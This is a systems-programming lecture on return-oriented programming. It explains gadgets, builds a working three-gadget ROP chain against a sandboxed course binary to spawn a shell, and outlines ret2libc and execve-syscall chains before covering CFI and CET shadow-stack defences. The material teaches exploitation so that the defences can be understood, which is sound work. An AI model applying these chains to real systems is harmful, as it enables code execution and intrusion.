# PROG 201 · Systems Programming in C
## Week 10 · Lecture 2 of 3
### Return-Oriented Programming

*“Beware of the Turing tar-pit in which everything is possible but nothing of interest is easy.”* — Alan Perlis, "Epigrams on Programming" (1982), #54

---

**Reading:** Shacham, *The Geometry of Innocent Flesh on the Bone* (CCS 2007) · Roemer et al., *Return-Oriented Programming* (2012) · `man 1 objdump` · **Previous:** L31 · **Next:** L33 — format strings, heap bugs, and the tooling that finds them

**Coursework:** 📝 **PS 10** released today, due Fri of Week 11 17:00 · 📋 **Project 2** released Fri this week, due Fri of Week 12 17:00 · 📝 **PS 9** due Fri this week 17:00 · 🔬 **Lab 10** Mon of Week 11 15:00–16:50 · 📊 **Quiz 11** Tue of Week 11

---

> **Sandboxed, on the course's binary, under `setarch -R`.** As L31 said: the point of building the
> attack is that the defences in §6 are unintelligible until you have seen one get through.

---

## 1. The Idea NX Forced

NX (L31 §4) says you cannot run code you put on the stack. But it says nothing about running code that is **already** in the program and already executable. Every instruction in `libc` and in the binary itself sits on an executable page — and among the millions of them are short sequences that end in `ret`.

A **gadget** is such a sequence: a handful of useful instructions followed by `ret`. Because it ends in `ret`, and `ret` pops the next address off the stack and jumps to it, **you can chain gadgets by filling the stack with their addresses.** The overflow from L31 gives you exactly that — control of the stack contents past the return address.

```
    return address   -> gadget 1   (does something, then ret)
    (data gadget 1 pops)
    gadget 2                       (ret pops this next)
    gadget 3
    ...
```

Each `ret` is the "instruction" that advances the program to the next gadget. **The stack has become the instruction stream**, and the CPU's own return mechanism is the interpreter. No code was injected; NX is satisfied on every page; and the sequence of gadgets can compute anything — Shacham's paper proved it is Turing-complete.

---

## 2. What a Gadget Looks Like

A gadget finder scans the executable pages for bytes ending in `0xc3` (`ret`) and reports the instructions before them. `ROPgadget` and `ropper` are the standard tools; **neither is installed on these machines**, so the course ships a forty-line finder:

```python
def find(binary, pattern):        # scan for byte patterns ending in c3
    ...
$ python3 gadget.py vuln
0x0000000000401016  add rsp,0x8 ; ret
0x0000000000401140  endbr64 ; ret
0x000000000040116e  xchg ax,ax ; ret
0x000000000040125a  pop rdi ; ret         <- the one the chain needs
0x000000000040125c  ret                   <- a bare ret, for alignment
```

The two the chain needs:

- **`pop rdi ; ret`** — pops the next stack word into `%rdi` (the first argument register, Week 4 L15 §4) and returns. This is how you pass an argument to a function using only returns.
- **A bare `ret`** — does nothing but advance eight bytes. §3 explains why you need it.

**A real target's gadgets come from libc**, which has hundreds of thousands of instructions. But there is a current wrinkle, measured: a modern, **CET-compiled glibc has strikingly few clean gadgets** — a byte scan of this machine's static libc found *zero* `pop rdi ; ret` sequences, because `endbr64` landing pads and compiler hardening have thinned them out. The course's target therefore supplies the two gadgets it needs in a small "gadget farm", which is how teaching targets are built; the build record documents the libc scarcity as a real finding.

---

## 3. Building the Chain

The target has a function that only does something useful when called with the right argument:

```c
void unlock(long key) {
    if (key == 0xc0ffee) { system("/bin/sh"); _exit(0); }
    ...
}
```

A plain return into `unlock` (ret2win) is not enough — you must **control `%rdi`** so that `key` is right. Three gadgets, in order on the stack after the 72-byte pad:

```python
OFFSET    = 72
G_RET     = 0x40125c        # a bare ret -- alignment
G_POP_RDI = 0x40125a        # pop rdi ; ret
UNLOCK    = 0x4011f6

chain  = b'A' * OFFSET
chain += p(G_RET)          # (1) realign the stack to 16 bytes
chain += p(G_POP_RDI)      # (2) pop the next word into rdi...
chain += p(0xc0ffee)       # (3) ...which is the key
chain += p(UNLOCK)         # (4) return into unlock, now rdi = 0xc0ffee
```

Trace it. The overflowing `ret` jumps to `G_RET`, which immediately returns to `G_POP_RDI`. That gadget pops `0xc0ffee` into `%rdi` and returns to `UNLOCK`. `unlock` runs with the argument the attacker chose, the check passes, and:

```
$ python3 exploit.py | setarch -R ./vuln
[unlock] correct key -- launching a shell
$ { python3 exploit.py; echo 'id -u; exit'; } | setarch -R ./vuln
INSIDE_SHELL uid=1000
```

**Measured: a genuine multi-gadget chain that controls a register and spawns a real shell** — `uid=1000` is a command executing in it. Two gadgets and a return address, and NX never fired because every byte executed was already an executable instruction in the program.

### The alignment gadget

Why the bare `ret` at the front? **`system` (and any function using SSE) requires the stack to be 16-byte aligned** when it is called, because `movaps` faults on a misaligned address. A `ret2win` chain lands `unlock` at an offset that leaves the stack 8-off, and `system`'s internal `movaps` crashes:

```
[win] you redirected control flow here
Segmentation fault              <- inside system(), on a movaps
```

The extra `ret` consumes 8 bytes and shifts everything back into alignment. **This is the single most common "my ROP chain reaches the function and then crashes" bug**, and recognising the movaps SIGSEGV for what it is saves an afternoon.

---

## 4. ret2libc, and the General Shape

Our target had a convenient `unlock`. A real chain does not; it reaches into **libc** for `system` and for the string `"/bin/sh"`, both of which are always present:

```
pop rdi ; ret
address of "/bin/sh" in libc
address of system in libc
```

Same shape: set `%rdi` to point at the string, return into `system`. This is **ret2libc**, it predates general ROP, and it needs only one gadget plus two libc addresses. Which is why it is defeated by the same thing that defeats ROP: **you need the libc base address**, and ASLR randomises it (L31 §5) — so ret2libc against an ASLR'd process requires an information leak first.

The general shape of every ROP exploit:

1. **A memory-corruption bug** to get control of the stack (L31).
2. **Gadgets** to set up registers and memory.
3. **A target** — a libc function, or a `syscall` gadget to make a system call directly.
4. **Addresses**, which means either a non-PIE / non-ASLR target (the sandbox) or an **information leak** (the real world).

The most powerful version replaces step 3 with a direct `execve("/bin/sh", 0, 0)` syscall, built entirely from `pop` gadgets and one `syscall` gadget — no libc function needed, just its bytes.

---

## 5. Turning It Off: CFI and the Shadow Stack

ROP works because a `ret` will jump **anywhere** the stack tells it to. The two defences attack exactly that freedom.

**Control-Flow Integrity (CFI)** restricts indirect branches to a precomputed set of valid targets. An indirect call may only reach functions of the right *type*; a `ret` may only reach a real call site. clang implements it, and it is measured:

```c
static int add(int a, int b) { return a + b; }
static void evil(void) { ... }               // WRONG type
table[0] = (binop) evil;                      // corrupt the pointer
table[0](2, 3);                               // indirect call
```

```
$ ./cfi_off x
[cfi] control reached evil()                  <- the corrupted call went through

$ ./cfi_on x
cfi.c:10: runtime error: control flow integrity check for type
    'int (int, int)' failed during indirect function call
    note: evil defined here
```

**Measured: with CFI on, the type-confused indirect call is caught before it transfers control**, and the tool even names the function the pointer was aimed at. A ROP chain's returns land in the middle of functions, at the wrong type, at non-call-sites — all of which CFI rejects. It costs a few percent and a whole-program (LTO) build, which is why it is opt-in rather than default.

**The hardware version is a shadow stack.** Intel CET keeps a second copy of every return address in memory the program cannot write, and checks the two match on every `ret`. An overflow changes the stack copy but not the shadow copy, so the mismatch is caught in hardware, for free.

Two honest measurements about CET on these machines:

- The compiler **emits the CET markers** — `endbr64` landing pads are in every binary (24 of them in `vuln`):
  ```
  $ objdump -d vuln | grep -c endbr64
  24
  ```
- But **the CPU does not support enforcement** — `/proc/cpuinfo` has no `shstk` or `ibt` flag, so those `endbr64` bytes are **inert NOPs**. The instructions are there for forward compatibility; nothing checks them.

So on this hardware, the ROP chain works precisely because the one defence that would stop it — a shadow stack — is not enforced. On a CET-capable CPU (Tiger Lake and later, most AMD Zen 3+), the same chain's first `ret` into a gadget would trip the shadow-stack check. **The defence exists, the binary is ready for it, and the silicon in front of you cannot run it** — which is the same "the mechanism is present but inert" shape as the `PRIO_INHERIT` finding in Week 3.

---

## Summary

- **NX forces code reuse.** A **gadget** is instructions ending in `ret`; filling the stack with gadget addresses makes the stack the instruction stream and `ret` the interpreter — Turing-complete, and NX-clean because every byte is already executable.
- The course ships a **40-line gadget finder** because `ROPgadget` and `ropper` are not installed.
- **A CET-compiled glibc has very few clean gadgets** — zero `pop rdi ; ret` in this machine's static libc — so the teaching target supplies its own.
- A **measured three-gadget chain** (`ret` for alignment, `pop rdi ; ret`, then `unlock`) controls a register and **spawns a shell, uid=1000**.
- **`system` needs a 16-byte-aligned stack**; the bare `ret` provides the alignment, and the missing-`ret` symptom is a `movaps` SIGSEGV *inside* the target.
- **ret2libc** is the same shape reaching into libc for `system` and `"/bin/sh"`; both it and ROP need addresses, hence an information leak against ASLR.
- **CFI** caught a type-confused indirect call and named the target function. A **shadow stack** catches ROP's returns in hardware — but this CPU has no CET enforcement, so the `endbr64` markers the compiler emitted are **inert**.

---

## Exercises

1. Run the course's gadget finder on `vuln` and on the static binary. How many gadgets does each have, and why does the tiny binary sometimes have the one you need and the huge libc not?
2. Build the three-gadget `unlock` chain from scratch, then remove the alignment `ret` and describe the exact crash. Which instruction, in which function?
3. Add a fourth gadget that also sets `%rsi`, and call a two-argument function. Where do you find a `pop rsi` gadget, and what if there isn't a clean one?
4. Write a ret2libc chain (find `system` and `"/bin/sh"` in libc with gdb) against the sandboxed target. Then turn ASLR on and watch it fail. What would you need to make it work?
5. Compile a program with clang CFI and a type-confused indirect call. Confirm the trap, then make the two functions the same type and show CFI now allows it. Why?
6. Count the `endbr64` instructions in three binaries on your machine. Then check `/proc/cpuinfo` for `shstk`. Are the markers doing anything?
7. Explain, in terms of what a `ret` is allowed to target, why a shadow stack stops ROP but a stack canary does not.

---

*PROG 201 · Week 10 · L32 · © CSE Department*
